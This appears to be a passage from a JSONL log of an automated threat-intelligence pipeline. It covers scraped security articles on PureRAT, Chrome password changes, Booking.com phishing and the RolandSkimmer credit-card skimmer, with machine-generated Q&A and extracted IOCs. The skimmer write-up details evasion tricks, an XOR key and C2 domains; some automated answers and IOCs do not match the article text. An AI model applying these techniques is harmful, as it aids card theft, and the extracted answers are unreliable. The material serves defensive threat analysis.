Microsoft Word or a PDF document by making use of double extensions (\"doc\\_054\\_[redacted].pdf.rar\").\n\nPresent within the archive file is an executable that, when launched, copies itself to the \"%AppData%\" location of the compromised Windows machine under the name \"task.exe\" and creates a Visual Basic Script called \"Task.vbs\" in the Startup VBS folder.\n\nThe executable then proceeds to unpack another executable \"ckcfb.exe\", runs the system utility \"InstallUtil.exe,\" and injects into it the decrypted module. \"Ckcfb.exe,\" for its part, extracts and decrypts a DLL file \"Spydgozoi.dll\" that incorporates the main payload of the PureRAT malware.\n\nPureRAT establishes SSL connections with a command-and-control (C2) server and transmits system information, including details about the antivirus products installed, the computer name, and the time elapsed since the system startup. In response, the C2 server sends auxiliary modules to perform a variety of malicious actions -\n\n- PluginPcOption, which is capable of executing commands for self-deletion, restarting the executable file, and shutting down or rebooting the computer\n- PluginWindowNotify, which checks the name of the active window for keywords like password, bank, WhatsApp, and perform appropriate follow-up actions like unauthorized fund transfers\n- PluginClipper, which functions as a clipper malware by substituting cryptocurrency wallet addresses copied to the system's clipboard with an attacker-controlled one\n\n\"The Trojan includes modules for downloading and running arbitrary files that provide full access to the file system, registry, processes, camera and microphone, implement keylogger functionality, and give attackers the ability to secretly control the computer using the remote desktop principle,\" Kaspersky said.\n\nThe original executable that launches \"ckcfb.exe\" simultaneously also extracts a second binary referred to as \"StilKrip.exe,\" which is a commercially available downloader dubbed PureCrypter that has been used to deliver various payloads in the past. It's active since 2022.\n\n\"StilKrip.exe\" is designed to download \"Bghwwhmlr.wav,\" which follows the aforementioned attack sequence to run \"InstallUtil.exe\" and ultimately launch \"Ttcxxewxtly.exe,\" an executable that unpacks and runs a DLL payload called PureLogs (\"Bftvbho.dll\").\n\nPureLogs is an off-the-shelf information stealer that can harvest data from web browsers, email clients, VPN services, messaging apps, wallet browser extensions, password managers, cryptocurrency wallet apps, and other programs like FileZilla and WinSCP.\n\n\"The PureRAT backdoor and PureLogs stealer have broad functionality that allows attackers to gain unlimited access to infected systems and confidential organization data,\" Kaspersky said. \"The main vector of attacks on businesses has been and remains emails with malicious attachments or links.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/google-chrome-can-now-auto-change.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The article mentions potential takeover attacks, as well as exploits such as zero-day exploits, Spectre v2 attacks, and ransomware attacks.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/google-chrome-can-now-auto-change.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://www.thehackernews.com/"}], "keywords_found": ["analysis", "threat", "apt", "malicious", "passwords", "botnet", "dropper", "browser"], "article_textual_content": "# Google Chrome Can Now Auto-Change Compromised Passwords Using Its Built-In Manager\n\nGoogle has announced a new feature in its Chrome browser that lets its built-in Password Manager automatically change a user's password when it detects the credentials to be compromised.\n\n\"When Chrome detects a compromised password during sign in, Google Password Manager prompts the user with an option to fix it automatically,\" Google's Ashima Arora, Chirag Desai, and Eiji Kitamura said. \"On supported websites, Chrome can generate a strong replacement and update the password for the user automatically.\"\n\nThe feature builds upon Password Manager's existing capabilities to generate strong passwords during sign-up and flag credentials that have been detected in a data breach.\n\nWith the automated password change, Google said the idea is to reduce friction and help users keep their accounts secure without having to search for relevant account settings or abandon the process midway.\n\nWebsite owners can support this feature by adopting the following methods -\n\n- Use autocomplete=\"current-password\" and autocomplete=\"new-password\" to trigger autofill and storage\n- Set up a redirect from &lt;your-website-domain&gt;/.well-known/change-password to the password change form on their website\n\n\"It would be much easier if password managers could navigate the user directly to the change-password URL,\" Kitamura said. \"This is where a well-known URL for changing passwords becomes useful.\"\n\n\"By reserving a well-known URL path that redirects the user to the change password page, the website can easily redirect users to the right place to change their passwords.\"\n\nThe development comes as companies are increasingly shifting to passkeys as a stronger alternative to protect accounts from potential takeover attacks. Earlier this month, Microsoft said it's making passkeys the default method when signing up for new customer accounts.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://medium.com/@claudiovolpecv710/performing-static-malware-analysis-on-a-sample-malware-dc3b5f19a818?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://medium.com/@claudiovolpecv710/performing-static-malware-analysis-on-a-sample-malware-dc3b5f19a818?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "c2server.evil"}], "keywords_found": ["analysis", "malicious"], "article_textual_content": "# Performing Static Malware Analysis On A Sample Malware\n\n16 hours ago\n\n--\n\nShare\n\nHey beginners if you’re looking to get into malware analysis and wondering where to start this could be one of your initial baby step. So halt your reins, stop wandering, relax and just dive into it.\n\nLearn as much as you can because in this article I will be sharing the steps to analyze a simple piece of malware using static analysis and also show the tools that are used for this purpose. So be on your toes and keep your antennas up for any new jargon or terminology that flies your way.\n\nThis is a basic article for beginners but everyone is welcome to read along, maybe you’ll get something out of it. So, let’s hop onto it beginner bees you have tons of work to do.\n\n# Let’s Begin!!!\n\nLet’s start by understanding what basically malware analysis is. Malware analysis involves examining and understanding malicious software (mal-ware as the name suggests) , to comprehend its functionality, behavior, and impact on computer systems or networks. This process aims to dissect and study the code, structure, and activities of the malware to identify its intent, methods of operation, and potential risks.\n\n## Types Of Malware Analysis\n\nThere are several types of malware analysis:\n\n- Static Analysis…\n\n--\n\n--\n\n## Written by ClaudioXXX\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://devsecopsai.today/inside-the-booking-com-phishing-scam-targeting-hotels-5a99d866a362?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is information-stealing malware, which is installed silently to extract login credentials, potentially even financial or booking system data.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing campaign that uses a fake CAPTCHA and a convincing email to infiltrate hotel systems, steal data, and compromise guest privacy.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The attackers aim to extract login credentials, potentially even financial or booking system data, through information-stealing malware installed after the fake CAPTCHA is completed.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The phishing campaign aims to steal login credentials for hotel systems, and possibly payment information from booking systems, which could include credit card data.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The attack is related to information-stealing malware, which can extract login credentials, financial, or booking system data, but it is not specifically referred to as a \"wallet stealer\".", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals information such as login credentials, financial data, and booking system data.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://devsecopsai.today/inside-the-booking-com-phishing-scam-targeting-hotels-5a99d866a362?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["threat", "fraud", "apt", "phishing", "cybercrime", "malicious", "passwords", "dropper", "browser", "transaction"], "article_textual_content": "# Inside the Booking.com Phishing Scam Targeting Hotels\n\nJust now\n\n--\n\nListen\n\nShare\n\nImagine this: It’s a busy Friday afternoon at a boutique hotel. The front desk manager is juggling calls, check-ins and last-minute booking requests. An email pops in — a Booking.com confirmation with all the right details. Nothing unusual. Just another guest, just another click.\nExcept… this one opens the door to something far more dangerous than a room without a view.\n\nWelcome to the newest front in cybercrime: where trusted names are hijacked, and everyday tasks become gateways for malware. A recent phishing campaign has taken aim at the hospitality industry, using Booking.com as bait to infiltrate hotel systems, steal data, and compromise guest privacy — all with just a fake CAPTCHA and a convincing email.\n\n# Anatomy of the Attack\n\n## Booking Confirmations That Aren’t\n\nThe attack starts with an email that looks like it’s from Booking.com. These emails contain realistic details like:\n\n- Guest names\n- Stay dates\n- Booking reference numbers\n\nThe level of accuracy here isn’t accidental — the attackers use leaked or scraped booking data to make the email appear genuine. It blends right into a busy hotel inbox.\n\n## The Fake CAPTCHA Trick\n\nEmbedded in the email is a link — ostensibly to verify booking info or confirm guest preferences. This link leads to a fake Booking.com page, which presents a CAPTCHA challenge. But this isn’t about checking if you are human — the CAPTCHA is a decoy.\n\n## Malware Dropper via CAPTCHA\n\nOnce the CAPTCHA is completed, malicious code is executed in the background. Based on what’s confirmed in both reports:\n\n- Information-stealing malware is installed silently.\n- The goal is to extract login credentials, potentially even financial or booking system data.\n\nThe malware is downloaded and activated through a JavaScript execution after CAPTCHA submission. This method avoids raising red flags for most users — making the compromise nearly invisible.\n\nFake Booking.com email [Source: Malwarebytes]\n\n# Urgency as a Weapon\n\nThe campaign uses psychological levers to increase its hit rate:\n\n- Immediate Check-In Dates: Emails mention that a guest is checking in “tomorrow,” compelling staff to act fast.\n- Fear of Losing Business: Hotel personnel are conditioned to prioritize bookings, making them more likely to click links without full verification.\n\nFake CAPTCHA [Source:Malwarebytes]\n\n# Who’s Being Targeted and Why?\n\n## Primary Targets: Hotel Front Desks\n\nThe attackers are aiming squarely at hotel staff who:\n\n- Handle online bookings\n- Regularly open emails with attachments and links\n- May not have advanced cybersecurity training\n\n## What They’re After: Data is Gold\n\nThe goal? Data — specifically:\n\n- Login credentials for hotel systems\n- Possibly payment information from booking systems\n\nWith this access, attackers can harvest guest data or sell it, use it for fraud or launch further attacks on other businesses and individuals.\n\n# Why It’s More Than Just a Scam\n\n## For Hotels: More Than Just a Breach\n\nIf successful, the attack can:\n\n- Compromise reservation systems\n- Damage reputation and trust\n- Trigger data protection violations\n\nHotels risk both financial loss and long-term damage to their brand if guest data is mishandled.\n\n## For Guests: Privacy at Risk\n\nEven though guests aren’t directly targeted, they become collateral damage. If their booking data is stolen, it could be used for:\n\n- Identity theft\n- Phishing emails impersonating the hotel\n- Credit card fraud\n\n# Defending Against the Threat\n\n- Email Verification: Always verify the sender’s email domain and inspect headers.\n- Safe Browsing: Avoid clicking on unfamiliar links — especially those outside the verified Booking.com domain.\n- Browser Hygiene: Keep systems and browsers updated to avoid exploiting known vulnerabilities.\n\n## Staff Training &amp; Reporting\n\nHuman error is often the weakest link.\n\n- Train staff to recognize phishing signs: urgency, typos, suspicious links.\n- Implement protocols for reporting unusual emails.\n- Use a verification checklist for any unusual Booking.com communication.\n\n## For Users\n\n- Avoid Saving Card Info: Do not store payment data unnecessarily on booking platforms.\n- Use Strong Passwords: Always opt for unique and complex credentials.\n- Monitor Statements: Watch for unexpected transactions.\n\nThis scam isn’t about breaking systems — it’s about exploiting trust. By imitating Booking.com, attackers are turning hotels into targets and guests into victims. But awareness is your firewall.\n\nStick to verified links. Question urgency. Train your team.\n\n## Stay One Step Ahead of Cybercriminals!\n\n🔹 The best defense is staying informed and proactive!\n\n🔹 Follow me for more insights on the latest cyber threats, attack trends and security best practices.\n\n🔗 Let’s connect and fortify our digital world together!\n\nBooking Scams\n\nMalware\n\nPhishing\n\nHotel Security\n\nCybersecurity\n\n--\n\n--\n\n## Written by Deven Chhajed\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/how-to-detect-phishing-attacks-faster.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server with specific parameters in the URL, including the site, data, and credit card number.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "banking trojan", "malicious", "analysis", "phishing", "threat", "apt", "botnet", "browser", "intelligence"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge 